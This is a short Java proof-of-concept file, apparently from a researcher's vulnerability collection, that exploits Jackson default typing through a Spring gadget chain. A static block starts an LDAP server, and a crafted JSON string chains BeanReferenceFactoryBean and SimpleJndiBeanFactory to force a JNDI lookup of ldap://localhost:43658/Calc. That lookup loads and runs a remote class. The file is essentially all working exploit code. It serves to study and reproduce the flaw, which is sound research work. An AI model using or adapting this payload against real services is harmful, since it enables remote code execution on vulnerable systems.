package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 *
 * spring gadget
 *
 *     <dependency>
 *       <groupId>org.springframework</groupId>
 *       <artifactId>spring-core</artifactId>
 *       <version>4.3.26.RELEASE</version>
 *     </dependency>
 *     <dependency>
 *       <groupId>org.springframework</groupId>
 *       <artifactId>spring-beans</artifactId>
 *       <version>3.0.7.RELEASE</version>
 *     </dependency>
 *     <dependency>
 *       <groupId>org.springframework</groupId>
 *       <artifactId>spring-web</artifactId>
 *       <version>4.3.26.RELEASE</version>
 *     </dependency>
 *
 * @author threedr3am
 */
public class SpringAopPoc2 {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"org.springframework.beans.factory.config.BeanReferenceFactoryBean\", {\"targetBeanName\": \"ldap://localhost:43658/Calc\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\", {\"shareableResources\":[\"ldap://localhost:43658/Calc\"]}]}]";
    Object o = mapper.readValue(json, Object.class);
  }


}
